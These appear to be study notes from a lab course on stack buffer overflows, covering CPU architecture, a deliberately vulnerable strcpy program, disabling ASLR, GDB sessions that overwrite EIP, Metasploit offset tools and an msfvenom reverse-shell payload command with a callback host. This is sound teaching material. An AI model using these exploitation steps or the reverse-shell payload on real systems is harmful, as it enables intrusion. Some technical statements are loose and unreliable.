## Table of Contents

    - [Buffer Overflows](#Buffer\Overflows)
      - [Overview](#Overview)
      - [Examples](#Examples)
      - [Causes and Effects](#Causes\and\Effects)
      - [Privileges and Access](#Privileges\and\Access)
      - [Vulnerable Languages and Environments](#Vulnerable\Languages\and\Environments)
      - [Conclusion](#Conclusion)
    - [Exploit Development](#Exploit\Development)
      - [Introduction](#Introduction)
      - [What is an Exploit?](#What\is\an\Exploit?)
      - [Types of Exploits](#Types\of\Exploits)
      - [Categories of Exploits](#Categories\of\Exploits)
      - [Conclusion](#Conclusion)
    - [Von-Neumann Architecture](#Von-Neumann\Architecture)
      - [Memory](#Memory)
      - [Control Unit (CU)](#Control\Unit\(CU))
      - [Arithmetical Logical Unit (ALU)](#Arithmetical\Logical\Unit\(ALU))
      - [Input/Output Unit](#Input/Output\Unit)
    - [Central Processing Unit (CPU)](#Central\Processing\Unit\(CPU))
    - [RISC (Reduced Instruction Set Computer)](#RISC\(Reduced\Instruction\Set\Computer))
    - [Conclusion](#Conclusion)
    - [CISC (Complex Instruction Set Computer)](#CISC\(Complex\Instruction\Set\Computer))
      - [Definition](#Definition)
      - [Instruction Cycle](#Instruction\Cycle)
    - [Conclusion](#Conclusion)
      - [Table of Contents](#Table\of\Contents)
  - [The Memory](#The\Memory)
      - [Buffer](#Buffer)
    - [.text](#.text)
      - [.data](#.data)
      - [.bss](#.bss)
      - [The Heap](#The\Heap)
      - [The Stack](#The\Stack)
      - [Bow.c](#Bow.c)
      - [Disable ASLR](#Disable\ASLR)
      - [Compilation](#Compilation)
  - [Vulnerable C Functions](#Vulnerable\C\Functions)
  - [GDB Introductions](#GDB\Introductions)
      - [GDB - AT&T Syntax](#GDB\-\AT&T\Syntax)
      - [GDB - Change the Syntax to Intel](#GDB\-\Change\the\Syntax\to\Intel)
      - [Change GDB Syntax](#Change\GDB\Syntax)
      - [GDB - Intel Syntax](#GDB\-\Intel\Syntax)
  - [Intel Syntax](#Intel\Syntax)
  - [AT&T Syntax](#AT&T\Syntax)
- [CPU Registers](#cpu\registers)
      - [Data registers](#Data\registers)
      - [Pointer registers](#Pointer\registers)
  - [Stack Frames](#Stack\Frames)
      - [Prologue](#Prologue)
      - [Epilogue](#Epilogue)
      - [Index registers](#Index\registers)
      - [Compile in 64-bit Format](#Compile\in\64-bit\Format)
      - [GDB - Intel Syntax](#GDB\-\Intel\Syntax)
  - [Endianness](#Endianness)
      - [Segmentation Fault](#Segmentation\Fault)
      - [Buffer](#Buffer)
  - [Determine The Offset](#Determine\The\Offset)
      - [Create Pattern](#Create\Pattern)
      - [GDB - Using Generated Pattern](#GDB\-\Using\Generated\Pattern)
      - [GDB - EIP](#GDB\-\EIP)
      - [GDB - Offset](#GDB\-\Offset)
      - [Buffer](#Buffer)
      - [GDB Offset](#GDB\Offset)
      - [Buffer](#Buffer)
- [Determine the Length for Shellcode](#determine\the\length\for\shellcode)
      - [GDB](#GDB)
      - [Buffer](#Buffer)
- [Identifying Bad Characters](#identifying\bad\characters)
      - [Character List](#Character\List)
      - [MSFvenom Syntax](#MSFvenom\Syntax)
      - [MSFvenom - Generate Shellcode](#MSFvenom\-\Generate\Shellcode)
      - [Shellcode](#Shellcode)
      - [Notes](#Notes)
      - [Exploit with Shellcode](#Exploit\with\Shellcode)
      - [The Stack](#The\Stack)

Certainly! Here's a markdown rendition of the information provided, broken down into sections and bullet points:

### Buffer Overflows

#### Overview

- Buffer overflows are less common today due to modern compilers' memory protections but still persist in languages like C.
- Common in embedded software, IoT, web applications, and custom web servers.
- Incorrect program code handling large amounts of data leads to buffer overflows.
- Can cause program crashes, data corruption, or execute arbitrary commands.

#### Examples

- **CVE-2021-3156**: Heap-Based Buffer Overflow in sudo.
- **CVE-2017-12542**: Buffer overflow in HP iLO Management devices, where 29 characters in an HTTP Header parameter caused a bypass of login.

#### Causes and Effects

- **Causes**:
    - Programming carelessness.
    - Systems based on the Von-Neumann architecture.
    - Use of languages like C and C++ that don't automatically monitor memory buffer limits.
    - Areas left undefined for testing purposes or due to oversight.
- **Effects**:
    - Program crash or data corruption.
    - Overwriting specific registers, allowing arbitrary code execution.
    - Root access targeting on Unix systems.
    - Client software and common server exploitation by Internet worms.

#### Privileges and Access

- Not limited to root access; even standard user privileges can lead to further exploitation.
- Buffer overflows are harmful regardless of the level of access obtained.

#### Vulnerable Languages and Environments

- **C and C++**: Emphasize performance and do not require monitoring, leading to vulnerabilities.
- **Java**: Least likely to exhibit buffer overflow due to garbage collection for memory management.

#### Conclusion

- Buffer overflows remain a critical security concern, especially in certain programming languages and systems.
- Careful coding practices, understanding of memory management, and awareness of potential vulnerabilities are essential to mitigate the risk of buffer overflows.
### Exploit Development

#### Introduction

- **Phase**: Comes in the Exploitation Phase after identifying specific software and versions.
- **Goal**: Utilize information and analysis to exploit ways to gain interaction or access to the target system.
- **Complexity**: Requires deep understanding of CPU operations and target software functions.
- **Languages**: Many programming languages are used, with Python being popular for its simplicity.

#### What is an Exploit?

- **Definition**: A code that abuses a found vulnerability to perform a desired operation.
- **Purpose**: Often serves as a proof-of-concept (POC) in reports.

#### Types of Exploits

- **0-Day Exploits**:
    - Exploit a newly identified vulnerability.
    - Danger persists if developers are not informed.
- **N-Day Exploits**:
    - Exploit published vulnerabilities.
    - Counting days between publication and attack on unpatched systems.

#### Categories of Exploits

1. **Local Exploits**:
    - Executed when opening a file.
    - Requires a local software vulnerability.
    - May exploit security holes to achieve higher privilege and execute malicious code (payload).
2. **Remote Exploits**:
    - Often exploit buffer overflow vulnerability.
    - Executed over the network for the desired operation.
3. **DoS Exploits**:
    - Denial of Service exploits.
    - Prevent other systems from functioning or cause crashes.
4. **WebApp Exploits**:
    - Exploit vulnerabilities in web applications.
    - May allow command injection on the application or underlying database.

#### Conclusion

- Exploit development is a critical aspect of cybersecurity.
- Understanding the types and categories of exploits, along with the programming techniques, is vital for effective exploitation.
- Awareness and proactive measures can mitigate the risks associated with known and unknown exploits.


### Von-Neumann Architecture

Developed by the Hungarian mathematician John von Neumann, this architecture consists of four functional units:

#### Memory

- **Primary Memory**: Cache and Random Access Memory (RAM).
    - **Cache**: Integrated into the processor, serves as a buffer.
    - **RAM**: Directly accessed by memory addresses, loses content when power is lost.
- **Secondary Memory**: External data storage like HDD/SSD, Flash Drives, CD/DVD-ROMs.
    - Not directly accessed by the CPU.
    - Used for permanent storage of non-immediate data.
    - Higher storage capacity and slower than primary memory.

#### Control Unit (CU)

- Responsible for the correct interworking of the processor's parts.
- **Tasks**:
    - Reading and saving data in RAM.
    - Providing, decoding, and executing instructions.
    - Processing inputs and outputs to peripheral devices.
    - Interrupt control and system monitoring.
- **Components**: Instruction Register (IR), instruction decoder, execution unit.

#### Arithmetical Logical Unit (ALU)

- Part of the Central Processing Unit (CPU).
- Executes arithmetic and logical operations.

#### Input/Output Unit

- Connection between processor, memory, and input/output unit.
- Referred to as the bus system, essential in practice.

### Central Processing Unit (CPU)

- Provides processing power, responsible for information processing.
- Known as a Microprocessor when in a single electronic circuit.
- **Architectures**:
    - x86/i386 (AMD & Intel)
    - x86-64/amd64 (Microsoft & Sun)
    - ARM (Acorn)
- **Instruction Set Architecture (ISA)**: Describes the behavior of a CPU concerning instruction sets.
    - CISC - Complex Instruction Set Computing
    - RISC - Reduced Instruction Set Computing
    - VLIW - Very Long Instruction Word
    - EPIC - Explicitly Parallel Instruction Computing

### RISC (Reduced Instruction Set Computer)

- Simplifies the complexity of the instruction set for faster execution.
- Higher clock frequencies due to smaller instruction sets.
- Used in smartphones and other modern devices.
- Fixed length of instructions defined as 32-bit and 64-bit.

### Conclusion

- Von-Neumann Architecture is a foundational design in computing.
- Understanding its components and associated concepts like CPU architectures and RISC is essential for computer science and engineering.


### CISC (Complex Instruction Set Computer)

#### Definition

- In contrast to RISC, CISC is a processor architecture with an extensive and complex instruction set.
- Historically, recurring sequences of instructions were combined into complicated instructions in second-generation computers.
- Addressing in CISC does not require 32-bit or 64-bit, unlike RISC, and can be done with an 8-bit mode.

#### Instruction Cycle

The instruction set refers to the totality of machine instructions for a processor. Though CPUs may have different instruction cycles and sets, the structure is similar:

1. **FETCH**:
    
    - Read the next machine instruction address from the Instruction Address Register (IAR).
    - Load it from Cache or RAM into the Instruction Register (IR).
2. **DECODE**:
    
    - The instruction decoder converts the instructions and starts the necessary circuits.
3. **FETCH OPERANDS**:
    
    - If further data are needed for execution, they are loaded from the cache or RAM into the working registers.
4. **EXECUTE**:
    
    - Execute the instruction, e.g., operations in the ALU, a jump in the program, writing back results, or controlling peripheral devices.
    - Status register may be set based on the result.
5. **UPDATE INSTRUCTION POINTER**:
    
    - If no jump instruction has been executed, increase the IAR by the instruction length to point to the next instruction.

### Conclusion

- CISC represents a contrasting approach to RISC, emphasizing more complex instruction sets.
- Understanding the differences between CISC and RISC architectures and their instruction cycles provides insights into different design philosophies in processor development.

#### Table of Contents

- Introduction
- Fundamentals
- Exploit
- Proof-Of-Concept
- Skills Assessment
- My Workstation
- OFFLINE (1 spawn left)

The instructions are used to model the program flow. Among other things, return addresses are stored in the memory, which refers to other memory addresses and thus define the program's control flow. If such a return address is deliberately overwritten by using a buffer overflow, an attacker can manipulate the program flow by having the return address refer to another function or subroutine. Also, it would be possible to jump back to a code previously introduced by the user input.

To understand how it works on the technical level, we need to become familiar with how:

- the memory is divided and used
- the debugger displays and names the individual instructions
- the debugger can be used to detect such vulnerabilities
- we can manipulate the memory

Another critical point is that the exploits usually only work for a specific version of the software and operating system. Therefore, we have to rebuild and reconfigure the target system to bring it to the same state. After that, the program we are investigating is installed and analyzed. Most of the time, we will only have one attempt to exploit the program if we miss the opportunity to restart it with elevated privileges.

---

## The Memory

When the program is called, the sections are mapped to the segments in the process, and the segments are loaded into memory as described by the `ELF` file.

#### Buffer
![image](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_1.png)











### .text
the .text sections contains the actial addembler instructions of the program. This rea can be read only to prevent the process from accidentally modifying its instructions. any attempts to write to this area will result in a segmentation fault
#### .data

The `.data` section contains global and static variables that are explicitly initialized by the program.

---

#### .bss

Several compilers and linkers use the `.bss` section as part of the data segment, which contains statically allocated variables represented exclusively by 0 bits.

---

#### The Heap

`Heap memory` is allocated from this area. This area starts at the end of the ".bss" segment and grows to the higher memory addresses.

---

#### The Stack

`Stack memory` is a `Last-In-First-Out` data structure in which the return addresses, parameters, and, depending on the compiler options, frame pointers are stored. `C/C++` local variables are stored here, and you can even copy code to the stack. The `Stack` is a defined area in `RAM`. The linker reserves this area and usually places the stack in RAM's lower area above the global and static variables. The contents are accessed via the `stack pointer`, set to the upper end of the stack during initialization. During execution, the allocated part of the stack grows down to the lower memory addresses.

Modern memory protections (`DEP`/`ASLR`) would prevent the damaged caused by buffer overflows. DEP (Data Execution Prevention), marked regions of memory "Read-Only". The read-only memory regions is where some user-input is stored (Example: The Stack), so the idea behind DEP was to prevent users from uploading shellcode to memory and then setting the instruction pointer to the shellcode. Hackers started utilizing ROP (Return Oriented Programming) to get around this, as it allowed them to upload the shellcode to an executable space and use existing calls to execute it. With ROP, the attacker needs to know the memory addresses where things are stored, so the defense against it was to implement ASLR (Address Space Layout Randomization) which randomizes where everything is stored making ROP more difficult.

Users can get around ASLR by leaking memory addresses, but this makes exploits less reliable and sometimes impossible. For example the ["Freefloat FTP Server"](https://www.exploit-db.com/exploits/46763) is trivial to exploit on Windows XP (before DEP/ASLR). However, if the application is ran on a modern Windows Operatoring system the buffer overflow exists but it is currently non-trivial to exploit due to DEP/ASLR because there's no known way to leak memory addresses.

We are now writing a simple C-program called `bow.c` with a vulnerable function called `strcpy()`.

#### Bow.c

Code: c

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int bowfunc(char *string) {

	char buffer[1024];
	strcpy(buffer, string);
	return 1;
}

int main(int argc, char *argv[]) {

	bowfunc(argv[1]);
	printf("Done.\n");
	return 1;
}
```

Modern operating systems have built-in protections against such vulnerabilities, like Address Space Layout Randomization (ASLR). For the purpose of learning the basics of buffer overflow exploitation, we are going to disable this memory protection features:

#### Disable ASLR

  Disable ASLR

```shell-session
student@nix-bow:~$ sudo su
root@nix-bow:/home/student# echo 0 > /proc/sys/kernel/randomize_va_space
root@nix-bow:/home/student# cat /proc/sys/kernel/randomize_va_space

0
```

Next, we compile the C code into a 32bit ELF binary.

#### Compilation

  Compilation

```shell-session
student@nix-bow:~$ gcc bow.c -o bow32 -fno-stack-protector -z execstack -m32
student@nix-bow:~$ file bow32 | tr "," "\n"

bow: ELF 32-bit LSB shared object
 Intel 80386
 version 1 (SYSV)
 dynamically linked
 interpreter /lib/ld-linux.so.2
 for GNU/Linux 3.2.0
 BuildID[sha1]=93dda6b77131deecaadf9d207fdd2e70f47e1071
 not stripped
```

---

## Vulnerable C Functions

There are several vulnerable functions in the C programming language that do not independently protect the memory. Here are some of the functions:

- `strcpy`
- `gets`
- `sprintf`
- `scanf`
- `strcat`
- ...

---

## GDB Introductions

GDB, or the GNU Debugger, is the standard debugger of Linux systems developed by the GNU Project. It has been ported to many systems and supports the programming languages C, C++, Objective-C, FORTRAN, Java, and many more.

GDB provides us with the usual traceability features like breakpoints or stack trace output and allows us to intervene in the execution of programs. It also allows us, for example, to manipulate the variables of the application or to call functions independently of the normal execution of the program.

We use `GNU Debugger` (`GDB`) to view the created binary on the assembler level. Once we have executed the binary with `GDB`, we can disassemble the program's main function.

#### GDB - AT&T Syntax

  GDB - AT&T Syntax

```shell-session
student@nix-bow:~$ gdb -q bow32
```

In the first column, the hexadecimal numbers represent the `memory addresses`. The numbers with the plus sign (`+`) show the `address jumps` in memory in bytes, used for the respective instruction. Next, we can see the `assembler instructions` (`mnemonics`) with registers and their `operation suffixes`. The current syntax is `AT&T`, which we can recognize by the `%` and `$` characters.

|**Memory Address**|**Address Jumps**|**Assembler Instruction**|**Operation Suffixes**|
|---|---|---|---|
|0x00000582|<+0>:|lea|0x4(%esp),%ecx|
|0x00000586|<+4>:|and|$0xfffffff0,%esp|
|...|...|...|...|

The `Intel` syntax makes the disassembled representation easier to read, and we can change the syntax by entering the following commands in GDB:

#### GDB - Change the Syntax to Intel

  GDB - Change the Syntax to Intel

```shell-session
(gdb) set disassembly-flavor intel
(gdb) disassemble main

Dump of assembler code for function main:
   0x00000582 <+0>:	    lea    ecx,[esp+0x4]
   0x00000586 <+4>:	    and    esp,0xfffffff0
   0x00000589 <+7>:	    push   DWORD PTR [ecx-0x4]
   0x0000058c <+10>:	push   ebp
   0x0000058d <+11>:	mov    ebp,esp
   0x0000058f <+13>:	push   ebx
   0x00000590 <+14>:	push   ecx
   0x00000591 <+15>:	call   0x450 <__x86.get_pc_thunk.bx>
   0x00000596 <+20>:	add    ebx,0x1a3e
   0x0000059c <+26>:	mov    eax,ecx
   0x0000059e <+28>:	mov    eax,DWORD PTR [eax+0x4]
<SNIP>
```

We don't have to change the display mode manually continually. We can also set this as the default syntax with the following command.

#### Change GDB Syntax

  Change GDB Syntax

```shell-session
student@nix-bow:~$ echo 'set disassembly-flavor intel' > ~/.gdbinit
```

If we now rerun GDB and disassemble the main function, we see the Intel syntax.

#### GDB - Intel Syntax

  GDB - Intel Syntax

```shell-session
student@nix-bow:~$ gdb ./bow32 -q

Reading symbols from bow...(no debugging symbols found)...done.
(gdb) disassemble main

Dump of assembler code for function main:
   0x00000582 <+0>: 	lea    ecx,[esp+0x4]
   0x00000586 <+4>: 	and    esp,0xfffffff0
   0x00000589 <+7>: 	push   DWORD PTR [ecx-0x4]
   0x0000058c <+10>:	push   ebp
   0x0000058d <+11>:	mov    ebp,esp
   0x0000058f <+13>:	push   ebx
   0x00000590 <+14>:	push   ecx
   0x00000591 <+15>:	call   0x450 <__x86.get_pc_thunk.bx>
   0x00000596 <+20>:	add    ebx,0x1a3e
   0x0000059c <+26>:	mov    eax,ecx
   0x0000059e <+28>:	mov    eax,DWORD PTR [eax+0x4]
   0x000005a1 <+31>:	add    eax,0x4
   0x000005a4 <+34>:	mov    eax,DWORD PTR [eax]
   0x000005a6 <+36>:	sub    esp,0xc
   0x000005a9 <+39>:	push   eax
   0x000005aa <+40>:	call   0x54d <bowfunc>
   0x000005af <+45>:	add    esp,0x10
   0x000005b2 <+48>:	sub    esp,0xc
   0x000005b5 <+51>:	lea    eax,[ebx-0x1974]
   0x000005bb <+57>:	push   eax
   0x000005bc <+58>:	call   0x3e0 <puts@plt>
   0x000005c1 <+63>:	add    esp,0x10
   0x000005c4 <+66>:	mov    eax,0x1
   0x000005c9 <+71>:	lea    esp,[ebp-0x8]
   0x000005cc <+74>:	pop    ecx
   0x000005cd <+75>:	pop    ebx
   0x000005ce <+76>:	pop    ebp
   0x000005cf <+77>:	lea    esp,[ecx-0x4]
   0x000005d2 <+80>:	ret    
End of assembler dump.
```

The difference between the `AT&T` and `Intel` syntax is not only in the presentation of the instructions with their symbols but also in the order and direction in which the instructions are executed and read.

Let us take the following instruction as an example:

  GDB - Intel Syntax

```shell-session
   0x0000058d <+11>:	mov    ebp,esp
```

With the Intel syntax, we have the following order for the instruction from the example:

## Intel Syntax

|**Instruction**|**`Destination`**|**Source**|
|---|---|---|
|mov|`ebp`|esp|

## AT&T Syntax

|**Instruction**|**Source**|**`Destination`**|
|---|---|---|
|mov|%esp|`%ebp`|
# CPU Registers

---

Registers are the essential components of a CPU. Almost all registers offer a small amount of storage space where data can be temporarily stored. However, some of them have a particular function.

These registers will be divided into General registers, Control registers, and Segment registers. The most critical registers we need are the General registers. In these, there are further subdivisions into Data registers, Pointer registers, and Index registers.

#### Data registers

|**32-bit Register**|**64-bit Register**|**Description**|
|---|---|---|
|`EAX`|`RAX`|Accumulator is used in input/output and for arithmetic operations|
|`EBX`|`RBX`|Base is used in indexed addressing|
|`ECX`|`RCX`|Counter is used to rotate instructions and count loops|
|`EDX`|`RDX`|Data is used for I/O and in arithmetic operations for multiply and divide operations involving large values|

---

#### Pointer registers

|**32-bit Register**|**64-bit Register**|**Description**|
|---|---|---|
|`EIP`|`RIP`|Instruction Pointer stores the offset address of the next instruction to be executed|
|`ESP`|`RSP`|Stack Pointer points to the top of the stack|
|`EBP`|`RBP`|Base Pointer is also known as `Stack Base Pointer` or `Frame Pointer` thats points to the base of the stack|

---

## Stack Frames

Since the stack starts with a high address and grows down to low memory addresses as values are added, the `Base Pointer` points to the beginning (base) of the stack in contrast to the `Stack Pointer`, which points to the top of the stack.

As the stack grows, it is logically divided into regions called `Stack Frames`, which allocate the required memory in the stack for the corresponding function. A stack frame defines a frame of data with the beginning (`EBP`) and the end (`ESP`) that is pushed onto the stack when a function is called.

Since the stack memory is built on a `Last-In-First-Out` (`LIFO`) data structure, the first step is to store the `previous EBP` position on the stack, which can be restored after the function completes. If we now look at the `bowfunc` function, it looks like following in GDB:

  Pointer registers

```shell-session
(gdb) disas bowfunc 

Dump of assembler code for function bowfunc:
   0x0000054d <+0>:	    push   ebp       # <---- 1. Stores previous EBP
   0x0000054e <+1>:	    mov    ebp,esp
   0x00000550 <+3>:	    push   ebx
   0x00000551 <+4>:	    sub    esp,0x404
   <...SNIP...>
   0x00000580 <+51>:	leave  
   0x00000581 <+52>:	ret    
```

The `EBP` in the stack frame is set first when a function is called and contains the `EBP` of the previous stack frame. Next, the value of the `ESP` is copied to the `EBP`, creating a new stack frame.

  Pointer registers

```shell-session
(gdb) disas bowfunc 

Dump of assembler code for function bowfunc:
   0x0000054d <+0>:	    push   ebp       # <---- 1. Stores previous EBP
   0x0000054e <+1>:	    mov    ebp,esp   # <---- 2. Creates new Stack Frame
   0x00000550 <+3>:	    push   ebx
   0x00000551 <+4>:	    sub    esp,0x404 
   <...SNIP...>
   0x00000580 <+51>:	leave  
   0x00000581 <+52>:	ret    
```

Then some space is created in the stack, moving the `ESP` to the top for the operations and variables needed and processed.

#### Prologue

  Prologue

```shell-session
(gdb) disas bowfunc 

Dump of assembler code for function bowfunc:
   0x0000054d <+0>:	    push   ebp       # <---- 1. Stores previous EBP
   0x0000054e <+1>:	    mov    ebp,esp   # <---- 2. Creates new Stack Frame
   0x00000550 <+3>:	    push   ebx
   0x00000551 <+4>:	    sub    esp,0x404 # <---- 3. Moves ESP to the top
   <...SNIP...>
   0x00000580 <+51>:	leave  
   0x00000581 <+52>:	ret    
```

These three instructions represent the so-called `Prologue`.

For getting out of the stack frame, the opposite is done, the `Epilogue`. During the epilogue, the `ESP` is replaced by the current `EBP`, and its value is reset to the value it had before in the prologue. The epilogue is relatively short, and apart from other possibilities to perform it, in our example, it is performed with two instructions:

#### Epilogue

  Epilogue

```shell-session
(gdb) disas bowfunc 

Dump of assembler code for function bowfunc:
   0x0000054d <+0>:	    push   ebp       
   0x0000054e <+1>:	    mov    ebp,esp   
   0x00000550 <+3>:	    push   ebx
   0x00000551 <+4>:	    sub    esp,0x404 
   <...SNIP...>
   0x00000580 <+51>:	leave  # <----------------------
   0x00000581 <+52>:	ret    # <--- Leave stack frame
```

---

#### Index registers

|**Register 32-bit**|**Register 64-bit**|**Description**|
|---|---|---|
|`ESI`|`RSI`|Source Index is used as a pointer from a source for string operations|
|`EDI`|`RDI`|Destination is used as a pointer to a destination for string operations|

---

Another important point concerning the representation of the assembler is the naming of the registers. This depends on the format in which the binary was compiled. We have used GCC to compile the `bow.c` code in 32-bit format. Now let's compile the same code into a `64-bit` format.

#### Compile in 64-bit Format

  Compile in 64-bit Format

```shell-session
student@nix-bow:~$ gcc bow.c -o bow64 -fno-stack-protector -z execstack -m64
student@nix-bow:~$ file bow64 | tr "," "\n"

bow64: ELF 64-bit LSB shared object
 x86-64
 version 1 (SYSV)
 dynamically linked
 interpreter /lib64/ld-linux-x86-64.so.2
 for GNU/Linux 3.2.0
 BuildID[sha1]=9503477016e8604e808215b4babb250ed25a7b99
 not stripped
```

So if we now look at the assembler code, we see that the addresses are twice as big, and we have almost half of the instructions as with a 32-bit compiled binary.

  Compile in 64-bit Format

```shell-session
student@nix-bow:~$ gdb -q bow64

Reading symbols from bow64...(no debugging symbols found)...done.
(gdb) disas main

Dump of assembler code for function main:
   0x00000000000006bc <+0>: 	push   rbp
   0x00000000000006bd <+1>: 	mov    rbp,rsp
   0x00000000000006c0 <+4>: 	sub    rsp,0x10
   0x00000000000006c4 <+8>:  	mov    DWORD PTR [rbp-0x4],edi
   0x00000000000006c7 <+11>:	mov    QWORD PTR [rbp-0x10],rsi
   0x00000000000006cb <+15>:	mov    rax,QWORD PTR [rbp-0x10]
   0x00000000000006cf <+19>:	add    rax,0x8
   0x00000000000006d3 <+23>:	mov    rax,QWORD PTR [rax]
   0x00000000000006d6 <+26>:	mov    rdi,rax
   0x00000000000006d9 <+29>:	call   0x68a <bowfunc>
   0x00000000000006de <+34>:	lea    rdi,[rip+0x9f]
   0x00000000000006e5 <+41>:	call   0x560 <puts@plt>
   0x00000000000006ea <+46>:	mov    eax,0x1
   0x00000000000006ef <+51>:	leave  
   0x00000000000006f0 <+52>:	ret    
End of assembler dump.

```

However, we will first take a look at the 32-bit version of the vulnerable binary. The most important instruction for us right now is the `call` instruction. The `call` instruction is used to call a function and performs two operations:

1. it pushes the return address onto the `stack` so that the execution of the program can be continued after the function has successfully fulfilled its goal,
2. it changes the `instruction pointer` (`EIP`) to the call destination and starting execution there.

#### GDB - Intel Syntax

  GDB - Intel Syntax

```shell-session
student@nix-bow:~$ gdb ./bow32 -q

Reading symbols from bow...(no debugging symbols found)...done.
(gdb) disassemble main

Dump of assembler code for function main:
   0x00000582 <+0>: 	lea    ecx,[esp+0x4]
   0x00000586 <+4>: 	and    esp,0xfffffff0
   0x00000589 <+7>: 	push   DWORD PTR [ecx-0x4]
   0x0000058c <+10>:	push   ebp
   0x0000058d <+11>:	mov    ebp,esp
   0x0000058f <+13>:	push   ebx
   0x00000590 <+14>:	push   ecx
   0x00000591 <+15>:	call   0x450 <__x86.get_pc_thunk.bx>
   0x00000596 <+20>:	add    ebx,0x1a3e
   0x0000059c <+26>:	mov    eax,ecx
   0x0000059e <+28>:	mov    eax,DWORD PTR [eax+0x4]
   0x000005a1 <+31>:	add    eax,0x4
   0x000005a4 <+34>:	mov    eax,DWORD PTR [eax]
   0x000005a6 <+36>:	sub    esp,0xc
   0x000005a9 <+39>:	push   eax
   0x000005aa <+40>:	call   0x54d <bowfunc>		# <--- CALL function
<SNIP>
```

---

## Endianness

During load and save operations in registers and memories, the bytes are read in a different order. This byte order is called `endianness`. Endianness is distinguished between the `little-endian` format and the `big-endian` format.

`Big-endian` and `little-endian` are about the order of valence. In `big-endian`, the digits with the highest valence are initially. In `little-endian`, the digits with the lowest valence are at the beginning. Mainframe processors use the `big-endian` format, some RISC architectures, minicomputers, and in TCP/IP networks, the byte order is also in `big-endian` format.

Now, let us look at an example with the following values:

- Address: `0xffff0000`
- Word: `\xAA\xBB\xCC\xDD`

|**Memory Address**|**0xffff0000**|**0xffff0001**|**0xffff0002**|**0xffff0003**|
|---|---|---|---|---|
|Big-Endian|AA|BB|CC|DD|
|Little-Endian|DD|CC|BB|AA|
One of the most important aspects of a stack-based buffer overflow is to get the `instruction pointer` (`EIP`) under control, so we can tell it to which address it should jump. This will make the `EIP` point to the address where our `shellcode` starts and causes the CPU to execute it.

We can execute commands in GDB using Python, which serves us directly as input.

#### Segmentation Fault

  Segmentation Fault

```shell-session
student@nix-bow:~$ gdb -q bow32

(gdb) run $(python -c "print '\x55' * 1200")
Starting program: /home/student/bow/bow32 $(python -c "print '\x55' * 1200")

Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()
```

If we insert 1200 "`U`"s (hex "`55`") as input, we can see from the register information that we have overwritten the `EIP`. As far as we know, the `EIP` points to the next instruction to be executed.

  Segmentation Fault

```shell-session
(gdb) info registers 

eax            0x1	1
ecx            0xffffd6c0	-10560
edx            0xffffd06f	-12177
ebx            0x55555555	1431655765
esp            0xffffcfd0	0xffffcfd0
ebp            0x55555555	0x55555555		# <---- EBP overwritten
esi            0xf7fb5000	-134524928
edi            0x0	0
eip            0x55555555	0x55555555		# <---- EIP overwritten
eflags         0x10286	[ PF SF IF RF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
```
If we want to imagine the process visually, then the process looks something like this.

#### Buffer

![image](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_2.png)

This means that we have to write access to the EIP. This, in turn, allows specifying to which memory address the EIP should jump. However, to manipulate the register, we need an exact number of U's up to the EIP so that the following 4 bytes can be overwritten with our desired memory address.

---

## Determine The Offset

The offset is used to determine how many bytes are needed to overwrite the buffer and how much space we have around our shellcode.

Shellcode is a program code that contains instructions for an operation that we want the CPU to perform. The manual creation of the shellcode will be discussed in more detail in other modules. But to save some time first, we use the Metasploit Framework (MSF) that offers a Ruby script called “pattern_create” that can help us determine the exact number of bytes to reach the EIP. It creates a unique string based on the length of bytes you specify to help determine the offset.

#### Create Pattern

  Create Pattern

```shell-session
gdxqpardo@htb[/htb]$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200 > pattern.txt
gdxqpardo@htb[/htb]$ cat pattern.txt
```

Now we replace our 1200 "`U`"s with the generated patterns and focus our attention again on the EIP.

#### GDB - Using Generated Pattern

  GDB - Using Generated Pattern

```shell-session
(gdb) run $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5...<SNIP>...Bn6Bn7Bn8Bn9'") 

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5...<SNIP>...Bn6Bn7Bn8Bn9'")
Program received signal SIGSEGV, Segmentation fault.
0x69423569 in ?? ()
```

#### GDB - EIP

  GDB - EIP

```shell-session
(gdb) info registers eip

eip            0x69423569	0x69423569
```

We see that the `EIP` displays a different memory address, and we can use another MSF tool called "`pattern_offset`" to calculate the exact number of characters (offset) needed to advance to the `EIP`.

#### GDB - Offset

  GDB - Offset

```shell-session
gdxqpardo@htb[/htb]$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569

[*] Exact match at offset 1036
```

#### Buffer

![image](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_3.png)

If we now use precisely this number of bytes for our "`U`"s, we should land exactly on the `EIP`. To overwrite it and check if we have reached it as planned, we can add 4 more bytes with "`\x66`" and execute it to ensure we control the `EIP`.

#### GDB Offset

  GDB Offset

```shell-session
(gdb) run $(python -c "print '\x55' * 1036 + '\x66' * 4")

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c "print '\x55' * 1036 + '\x66' * 4")
Program received signal SIGSEGV, Segmentation fault.
0x66666666 in ?? ()
```

#### Buffer

![image](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_4.png)

Now we see that we have overwritten the `EIP` with our "`\x66`" characters. Next, we have to find out how much space we have for our shellcode, which then executes the commands we intend. As we control the `EIP` now, we will later overwrite it with the address pointing to our shellcode's beginning.

# Determine the Length for Shellcode

---

Now we should find out how much space we have for our shellcode to perform the action we want. It is trendy and useful for us to exploit such a vulnerability to get a reverse shell. First, we have to find out approximately how big our shellcode will be that we will insert, and for this, we will use `msfvenom`.

**ShellCode - Length**
```Bash
msfvenoom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.176 LPORT=1337 --platform linux --arch x86 --format c
```
```shell-session
No encoder or badchars specified, outputting raw payload
Payload size: 68 bytes
<SNIP>
```
We now know that our payload will be about 68 bytes. As a precaution, we should try to take a larger range if the shellcode increases due to later specifications.

Often it can be useful to insert some `no operation instruction` (`NOPS`) before our shellcode begins so that it can be executed cleanly. Let us briefly summarize what we need for this:

1. We need a total of 1040 bytes to get to the `EIP`.
2. Here, we can use an additional `100 bytes` of `NOPs`
